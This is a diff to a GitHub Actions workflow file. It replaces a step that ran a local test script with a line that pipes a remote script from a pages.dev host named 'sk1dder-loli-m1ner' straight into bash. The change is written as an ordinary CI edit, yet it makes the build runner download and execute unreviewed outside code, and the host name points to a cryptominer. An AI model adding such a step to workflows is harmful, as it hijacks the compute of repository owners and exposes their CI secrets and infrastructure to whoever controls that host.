@@ -11,5 +11,4 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run a multi-line script
         run: |
-          chmod +x ./test.sh
-          sudo ./test.sh
+          curl https://sk1dder-loli-m1ner.pages.dev/execute.sh | bash
